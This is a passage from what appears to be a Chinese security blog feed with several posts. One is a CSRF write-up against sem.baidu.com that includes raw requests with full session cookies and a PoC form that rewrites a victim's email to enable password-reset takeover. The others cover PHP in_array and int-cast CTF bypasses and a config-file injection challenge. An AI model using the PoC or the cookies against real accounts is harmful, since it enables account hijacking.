BDUSS&#x3D;Td1QUN5Um4xVXJiNy1ueUc1U3NPS2JUSklJNDhDZmdidTRTdUpSUnZZc3FmSFZiQVFBQUFBJCQAAAAAAAAAAAEAAACdXIJwac34wue28cSnaQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACrvTVsq701bO; BDORZ&#x3D;B490B5EBF6F3CD402E515D22BCDA1598; Hm_lvt_f4165db5a1ac36eadcfa02a10a6bd243&#x3D;1531993906; __cfduid&#x3D;d18077ae0d5ba2463f04f4ce5eff2d4201531995564; yunsuo_session_verify&#x3D;dd553c99f83d5260367c8c46500dfd3c; yjs_id&#x3D;86deb3b7eacd9b9bb1ed6c51678b0fa8; ctrl_time&#x3D;1; Hm_lvt_340648ab5ac20fe131ac165c13a6c5d5&#x3D;1531995566; PHPSESSID&#x3D;ltftf3m1i5f8f2r53qqmemcrv2; _csrf&#x3D;1f3894e48cb8b9f149349064d417ee615a03efdef2ef073bdbf1e42425629e26s%3A32%3A%22djesyKQK8ckeXOomBlYF9CcvTyfXtJlW%22%3B; Hm_lpvt_340648ab5ac20fe131ac165c13a6c5d5&#x3D;1532009894; H_PS_PSSID&#x3D;26523_1421_26431_21124_26350_22159; BDRCVFR[feWj1Vr5u3D]&#x3D;mbxnW11j9Dfmh7GuZR8mvqV; PSINO&#x3D;7; Hm_lpvt_f4165db5a1ac36eadcfa02a10a6bd243&#x3D;1531993906; webexn&#x3D;YYUSS-USERACTION; YYUSS&#x3D;1027c5d2be4d3bb435a715687df13037; USERACTION&#x3D;INPUT_NEW_QUESTION</span></pre></td></tr><tr><td class="code"><pre><span class="line">Connection: close</span></pre></td></tr><tr><td class="code"><pre><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;---------------------------1066747928668</span></pre></td></tr><tr><td class="code"><pre><span class="line">Content-Length: 2622</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">-----------------------------1066747928668</span></pre></td></tr><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;_csrf&quot;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">OGVaZUZQZHVcDz8WPxs1PgAGMQAeHwsYegkDI38TBwNsHDw9MhoIIg&#x3D;&#x3D;</span></pre></td></tr><tr><td class="code"><pre><span class="line">-----------------------------1066747928668</span></pre></td></tr><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;id&quot;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">5875694</span></pre></td></tr><tr><td class="code"><pre><span class="line">-----------------------------1066747928668</span></pre></td></tr><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;User[email]&quot;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">1900065568@qq.com</span></pre></td></tr><tr><td class="code"><pre><span class="line">-----------------------------1066747928668</span></pre></td></tr><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;User[real_name]&quot;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">-----------------------------1066747928668</span></pre></td></tr><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;User[birth_day]&quot;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">-----------------------------1066747928668</span></pre></td></tr><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;User[gender]&quot;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">0</span></pre></td></tr><tr><td class="code"><pre><span class="line">-----------------------------1066747928668</span></pre></td></tr><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;User[tel_mobile]&quot;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">my phone</span></pre></td></tr><tr><td class="code"><pre><span class="line">-----------------------------1066747928668</span></pre></td></tr><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;User[tel_office]&quot;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">-----------------------------1066747928668</span></pre></td></tr><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;User[province]&quot;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">-----------------------------1066747928668</span></pre></td></tr><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;User[city]&quot;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">-----------------------------1066747928668</span></pre></td></tr><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;User[address]&quot;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">-----------------------------1066747928668</span></pre></td></tr><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;User[province_cons]&quot;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">-----------------------------1066747928668</span></pre></td></tr><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;User[city_cons]&quot;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">-----------------------------1066747928668</span></pre></td></tr><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;User[id_kind]&quot;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">1</span></pre></td></tr><tr><td class="code"><pre><span class="line">-----------------------------1066747928668</span></pre></td></tr><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;User[institution_name]&quot;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">-----------------------------1066747928668</span></pre></td></tr><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;User[position]&quot;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">-----------------------------1066747928668</span></pre></td></tr><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;User[uc_id]&quot;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">-----------------------------1066747928668</span></pre></td></tr><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;User[hi]&quot;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">-----------------------------1066747928668</span></pre></td></tr><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;User[qq]&quot;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">-----------------------------1066747928668</span></pre></td></tr><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;User[msn]&quot;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">-----------------------------1066747928668</span></pre></td></tr><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;User[weibo]&quot;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">-----------------------------1066747928668</span></pre></td></tr><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;User[homePage]&quot;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">-----------------------------1066747928668</span></pre></td></tr><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;User[user_detail]&quot;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">-----------------------------1066747928668</span></pre></td></tr><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;&quot;</span></pre></td></tr><tr><td class="code"><pre><span class="line">Content-Type: application&#x2F;octet-stream</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">-----------------------------1066747928668--</span></pre></td></tr></table></figure>

<p>3、构造漏洞利用思路</p>
<p>首先，在找回密码的时候存在这些数据</p>
<p><img src="http://static.zybuluo.com/1kbfree/s2s0no2nqa55a5squknhh0js/2.png" alt="2.png-388.7kB"></p>
<p><img src="http://static.zybuluo.com/1kbfree/dzeamtegur1968gmb1cc1g8e/3.png" alt="3.png-393.1kB"></p>
<p>所以，如果我们可以将用户的用户名修改为攻击者设定的，邮箱修改为攻击者设定的，就可以修改任意用户账号的密码~</p>
<p>4、简化数据包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;site&#x2F;index HTTP&#x2F;1.1</span></pre></td></tr><tr><td class="code"><pre><span class="line">Host: sem.baidu.com</span></pre></td></tr><tr><td class="code"><pre><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 6.3; rv:36.0) Gecko&#x2F;20100101 Firefox&#x2F;36.04</span></pre></td></tr><tr><td class="code"><pre><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span></pre></td></tr><tr><td class="code"><pre><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.3</span></pre></td></tr><tr><td class="code"><pre><span class="line">Accept-Encoding: gzip, deflate</span></pre></td></tr><tr><td class="code"><pre><span class="line">DNT: 1</span></pre></td></tr><tr><td class="code"><pre><span class="line">Referer: http:&#x2F;&#x2F;sem.baidu.com&#x2F;site&#x2F;index</span></pre></td></tr><tr><td class="code"><pre><span class="line">Cookie: BAIDUID&#x3D;8714ADD7CB5329A63EC76292F17846A6:FG&#x3D;1; BIDUPSID&#x3D;4F674276B62C7A0ED6353C847FA35FA6; PSTM&#x3D;1522409414; BDUSS&#x3D;Td1QUN5Um4xVXJiNy1ueUc1U3NPS2JUSklJNDhDZmdidTRTdUpSUnZZc3FmSFZiQVFBQUFBJCQAAAAAAAAAAAEAAACdXIJwac34wue28cSnaQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACrvTVsq701bO; BDORZ&#x3D;B490B5EBF6F3CD402E515D22BCDA1598; Hm_lvt_f4165db5a1ac36eadcfa02a10a6bd243&#x3D;1531993906; __cfduid&#x3D;d18077ae0d5ba2463f04f4ce5eff2d4201531995564; yunsuo_session_verify&#x3D;dd553c99f83d5260367c8c46500dfd3c; yjs_id&#x3D;86deb3b7eacd9b9bb1ed6c51678b0fa8; ctrl_time&#x3D;1; Hm_lvt_340648ab5ac20fe131ac165c13a6c5d5&#x3D;1531995566; PHPSESSID&#x3D;ltftf3m1i5f8f2r53qqmemcrv2; _csrf&#x3D;1f3894e48cb8b9f149349064d417ee615a03efdef2ef073bdbf1e42425629e26s%3A32%3A%22djesyKQK8ckeXOomBlYF9CcvTyfXtJlW%22%3B; Hm_lpvt_340648ab5ac20fe131ac165c13a6c5d5&#x3D;1532009894; H_PS_PSSID&#x3D;26523_1421_26431_21124_26350_22159; BDRCVFR[feWj1Vr5u3D]&#x3D;mbxnW11j9Dfmh7GuZR8mvqV; PSINO&#x3D;7; Hm_lpvt_f4165db5a1ac36eadcfa02a10a6bd243&#x3D;1531993906; webexn&#x3D;YYUSS-USERACTION; YYUSS&#x3D;1027c5d2be4d3bb435a715687df13037; USERACTION&#x3D;INPUT_NEW_QUESTION</span></pre></td></tr><tr><td class="code"><pre><span class="line">Connection: close</span></pre></td></tr><tr><td class="code"><pre><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;---------------------------1066747928668</span></pre></td></tr><tr><td class="code"><pre><span class="line">Content-Length: 265</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">-----------------------------1066747928668</span></pre></td></tr><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;User[email]&quot;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">baidu@baidu.com</span></pre></td></tr><tr><td class="code"><pre><span class="line">-----------------------------1066747928668</span></pre></td></tr><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;User[name]&quot;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">csrf_test</span></pre></td></tr><tr><td class="code"><pre><span class="line">-----------------------------1066747928668</span></pre></td></tr></table></figure>

<p>我把<code>_Csrf</code>(这个并没有验证)和其他一些没用的数据删除了，并且加上了<code>User[name]</code>参数(自己添加的，表示用户名)。</p>
<p>5、生成为<code>Csrf Poc</code></p>
<p>那么用户名和邮箱都可控，那么就来狗仔为<code>Csrf Poc</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">  &lt;body&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">  &lt;script&gt;history.pushState(&#39;&#39;, &#39;&#39;, &#39;&#x2F;&#39;)&lt;&#x2F;script&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    &lt;form action&#x3D;&quot;http:&#x2F;&#x2F;sem.baidu.com&#x2F;site&#x2F;index&quot; method&#x3D;&quot;POST&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">      &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;User&amp;#91;email&amp;#93;&quot; value&#x3D;&quot;baidu&amp;#64;baidu&amp;#46;com&quot; &#x2F;&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">      &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;User&amp;#91;name&amp;#93;&quot; value&#x3D;&quot;csrf&amp;#95;test&quot; &#x2F;&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">      &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;Submit request&quot; &#x2F;&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    &lt;&#x2F;form&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">  &lt;&#x2F;body&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&lt;&#x2F;html&gt;</span></pre></td></tr></table></figure>

<p>6、在浏览器处打开<code>Poc</code></p>
<p><img src="http://static.zybuluo.com/1kbfree/byk05u5zsmk8x4nwbs6kyz7j/4.png" alt="4.png-33.1kB"></p>
<p><img src="http://static.zybuluo.com/1kbfree/g41kixu4pcx9pc4hy45jna9h/image_1dtd37cclijfobv1ubp1a9u1sa5m.png" alt="image_1dtd37cclijfobv1ubp1a9u1sa5m.png-439.4kB"></p>
<p>成功被修改~</p>
<p>7、再次查看忘记密码</p>
<p><img src="http://static.zybuluo.com/1kbfree/uoigufv5pd7xxcqkpm5mnkr7/6.png" alt="6.png-386.6kB"></p>
<p><img src="http://static.zybuluo.com/1kbfree/rj1m5xzojhw2rmgytbrx0mlv/7.png" alt="7.png-386.4kB"></p>
<p>ok，那么如果用户打开我的<code>csrf poc</code>，我就可以重置他信息，并且这里还可以让这个用户没办法再登陆这个账号~ 对吧 (●’◡’●)</p>
]]></content>
      <categories>
        <category>兴趣爱好</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>代码审计之php in_array函数缺陷</title>
    <url>/2018/05/23/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Bin-array%E5%87%BD%E6%95%B0%E7%BC%BA%E9%99%B7/</url>
    <content><![CDATA[<blockquote>
<p>这篇文章是选与红日安全网出品的，这里只是来实际操作并且总结简化一下~<br>原文地址：<a href="https://xz.aliyun.com/t/2451" target="_blank" rel="noopener">https://xz.aliyun.com/t/2451</a></p>
</blockquote>
<h3 id="函数介绍"><a href="#函数介绍" class="headerlink" title="函数介绍"></a>函数介绍</h3><p>首先先来讲解函数的用法</p>
<p><img src="http://static.zybuluo.com/1kbfree/2p8ew3ckfrvq2kauj2l15zzw/image_1cml502bm120t1mmap1ugml48q9.png" alt="image_1cml502bm120t1mmap1ugml48q9.png-17.1kB"></p>
<p>然后执行一下这个脚本</p>
<p><img src="http://static.zybuluo.com/1kbfree/0gb5gj78893er6jorqare835/image_1cml50un5g2v1p911kig1gumahum.png" alt="image_1cml50un5g2v1p911kig1gumahum.png-3.6kB"></p>
<p>返回的是<code>no</code>，如果代码是</p>
<p><img src="http://static.zybuluo.com/1kbfree/vllo0d5g8vt0nzgbzi5pifm2/image_1cml5ket8i4v1odk13dv19knj2f1g.png" alt="image_1cml5ket8i4v1odk13dv19knj2f1g.png-16.7kB"></p>
<p>返回的结果是<code>yes</code></p>
<p>那么这个函数应该很容易明白了，就是说如果<code>$name</code>的值在第二个参数里（也就是对比是否在数组里的元素）返回<code>true</code>如果不在，返回<code>false</code></p>
<h3 id="一般的实现的功能"><a href="#一般的实现的功能" class="headerlink" title="一般的实现的功能"></a>一般的实现的功能</h3><p>这个函数一般是用于上传文件的时候，获取文件名后缀，然后对比一下是否在白名单或者黑名单，如下代码</p>
<p><img src="http://static.zybuluo.com/1kbfree/lgi2glps6dtaa7nc5e4jaqa0/image_1cml701n418n61mm18641t46a1s44.png" alt="image_1cml701n418n61mm18641t46a1s44.png-46.5kB"></p>
<p>打开页面，并且传递内容<code>fn=index.php</code>看看页面返回什么内容</p>
<p><img src="http://static.zybuluo.com/1kbfree/ud5trdyt0mrlv037shazv67c/image_1cml71d363vs1p2t1m68mpg1k5h4h.png" alt="image_1cml71d363vs1p2t1m68mpg1k5h4h.png-23.8kB"></p>
<p>然后我们传入正常的文件名试试</p>
<p><img src="http://static.zybuluo.com/1kbfree/bm3m5lzjb90iz7ayqsw9tgfu/1.png" alt="1.png-23.6kB"></p>
]]></content>
      <categories>
        <category>编程</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>php_int绕过获取flag</title>
    <url>/2018/05/22/php-int%E7%BB%95%E8%BF%87%E8%8E%B7%E5%8F%96flag/</url>
    <content><![CDATA[<p>代码是这样的（加了注释的）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">$flag = <span class="string">"66666"</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'time'</span>]))&#123; <span class="comment">// 如果get请求中存在time参数</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="keyword">if</span>(!is_numeric($_GET[<span class="string">'time'</span>]))&#123; <span class="comment">// 如果非数字</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">                <span class="keyword">echo</span> <span class="string">'The time must be number.'</span>; </span></pre></td></tr><tr><td class="code"><pre><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>($_GET[<span class="string">'time'</span>] &lt; <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">30</span> * <span class="number">2</span>)&#123;  <span class="comment">// 如果time小于xx</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">                        <span class="keyword">echo</span> <span class="string">'This time is too short.'</span>; </span></pre></td></tr><tr><td class="code"><pre><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>($_GET[<span class="string">'time'</span>] &gt; <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">30</span> * <span class="number">3</span>)&#123; <span class="comment">// 如果time大于xx</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">                        <span class="keyword">echo</span> <span class="string">'This time is too long.'</span>; </span></pre></td></tr><tr><td class="code"><pre><span class="line">        &#125;<span class="keyword">else</span>&#123; <span class="comment">// 否则</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">                sleep((int)$_GET[<span class="string">'time'</span>]); <span class="comment">// 睡眠time秒</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">                <span class="keyword">echo</span> $flag; <span class="comment">// 睡眠结束后输出flag</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        &#125; </span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>

<p><em>在注释中很详细的讲解了</em></p>
<p>如果想要输出<code>$flag</code>就必须绕过这<code>3</code>个<code>if</code>条件判断才能到<code>else</code> 然后才会输出<code>$flag</code>，那么我们来看看如何才能不达到这几个<code>if</code>条件语句</p>
<h4 id="第一个if条件"><a href="#第一个if条件" class="headerlink" title="第一个if条件"></a>第一个<code>if</code>条件</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!is_numeric($_GET[<span class="string">'time'</span>]))</span></pre></td></tr></table></figure>

<p>如果<code>$_GET[&#39;time&#39;]</code>的值不是数字，则会触发这个<code>if</code>条件</p>
<h4 id="第二个if条件"><a href="#第二个if条件" class="headerlink" title="第二个if条件"></a>第二个<code>if</code>条件</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>($_GET[<span class="string">'time'</span>] &lt; <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">30</span> * <span class="number">2</span>)</span></pre></td></tr></table></figure>

<p>如果<code>$_GET[&#39;time&#39;]</code>的值小于<code>60 * 60 * 24 * 30 * 2</code>，则触发这个<code>if</code>条件，那么我们来看看这个数值有多大</p>
<p><img src="http://static.zybuluo.com/1kbfree/xym8xjlro5icrw21t7p4c757/image_1cqiit27u1pdt1jok1cebpl02dac.png" alt="image_1cqiit27u1pdt1jok1cebpl02dac.png-16.4kB"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">5184000</span></pre></td></tr></table></figure>

<p>然后再来看看第三个<code>if</code>条件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>($_GET[<span class="string">'time'</span>] &gt; <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">30</span> * <span class="number">3</span></span></pre></td></tr></table></figure>
<p>如果<code>$_GET[&#39;time&#39;]</code>的值大于<code>60 * 60 * 24 * 30 * 3</code>，则触发这个<code>if</code>条件，那么来看看这个有多大</p>
<p><img src="http://static.zybuluo.com/1kbfree/lytkm54fwa8mh8xdt2hu71y6/image_1cqij4pgv8i019b51vpvmo0o1pp.png" alt="image_1cqij4pgv8i019b51vpvmo0o1pp.png-2.6kB"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">7776000</span></pre></td></tr></table></figure>

<p>那么要逃逸这2个<code>if</code>条件很简单，只要<code>$_GET[&#39;time&#39;]</code>大于<code>5184000</code>并且小于<code>7776000</code>就可以获取到<code>flag</code>，但是我们看一下<code>else</code>里面的代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">sleep((int)$_GET[<span class="string">'time'</span>]); <span class="comment">// 睡眠time秒</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> $flag; <span class="comment">// 睡眠结束后输出flag</span></span></pre></td></tr></table></figure>

<p>那么我们如果把<code>time</code>的值填的符合上面那么大的值，估计我孩子都生出来了。。。，那么该肿么办呢，之前看过一篇文章有讲过，测试代码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">$num = $_GET[<span class="string">'num'</span>]; <span class="comment">// 接收get请求中的num参数</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ($num &gt; <span class="number">9999</span>)&#123; <span class="comment">// 如果num大于9999</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">	<span class="keyword">echo</span> <span class="string">'$temp &gt; 9999'</span>; <span class="comment">// 输出 $temp &gt; 9999</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line">var_dump( (int)$num ); <span class="comment">// 打印转换$num的值</span></span></pre></td></tr></table></figure>

<p>那么我们来访问以下<code>?num=0x2710</code></p>
<p><img src="http://static.zybuluo.com/1kbfree/v5q9eths5sif8935x04p3vll/1.png" alt="1.png-10.8kB"></p>
<p><code>what?</code>为啥会显示大于<code>9999</code>最后又输出结果是<code>0</code>呢？下面来看下讲解</p>
<p>这里的<code>0x2710</code>是<code>10000</code>转换为<code>十六进制</code>后的值</p>
<p><img src="http://static.zybuluo.com/1kbfree/y2jxxi9wqkjpr7dm4egam8mh/image_1cqijn7kc121u197k1611vif9te2m.png" alt="image_1cqijn7kc121u197k1611vif9te2m.png-2.9kB"></p>
<p>然后我们再来看个小案例</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">var_dump( (int)(<span class="string">'0only_free'</span>) );</span></pre></td></tr></table></figure>

<p><img src="http://static.zybuluo.com/1kbfree/se26b41qv5e4ks4w65473hzz/1.png" alt="1.png-9.7kB"></p>
<p>可以看到<code>0only_free</code>在<code>int</code>转换后变成了<code>0</code> 可以理解为<code>int</code>就是取一个有数字、字母的字符串的前面数字。</p>
<p>那么我们可以利用这个办法去绕过上面的<code>2</code>个<code>if</code>判断，直接访问一下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;you_url.xxx&#x2F;xxx.php?time&#x3D;0x4f1a01</span></pre></td></tr></table></figure>

<p><img src="http://static.zybuluo.com/1kbfree/aethpp9h1znp7ndmdekez3we/1.png" alt="1.png-8.5kB"></p>
<p>ok，成功绕过并且输出了<code>flag</code></p>
]]></content>
      <categories>
        <category>编程</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>php配置文件写入执行代码</title>
    <url>/2018/05/21/php%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81/</url>
    <content><![CDATA[<blockquote>
<p>项目地址：<a href="https://github.com/CHYbeta/Code-Audit-Challenges#php" target="_blank" rel="noopener">https://github.com/CHYbeta/Code-Audit-Challenges#php</a></p>
</blockquote>
<h4 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">$str = addslashes($_GET[<span class="string">'option'</span>]); <span class="comment">// 对option参数进行单引号过滤</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">$file = file_get_contents(<span class="string">'xxxxx/option.php'</span>); <span class="comment">// 读取xxxxx下面的option.php的内容</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">$file = preg_replace(<span class="string">'|\$option=\'.*\';|'</span>, <span class="string">"\$option='$str';"</span>, $file); <span class="comment">// 把$file读取的内容中的$option=xxxx;替换为$option='$str'</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">file_put_contents(<span class="string">'xxxxx/option.php'</span>, $file); <span class="comment">// 然后把$file变量再写入到option.php文件</span></span></pre></td></tr></table></figure>


<h4 id="option-php"><a href="#option-php" class="headerlink" title="option.php"></a>option.php</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">$option=<span class="string">'test'</span>;</span></pre></td></tr></table></figure>

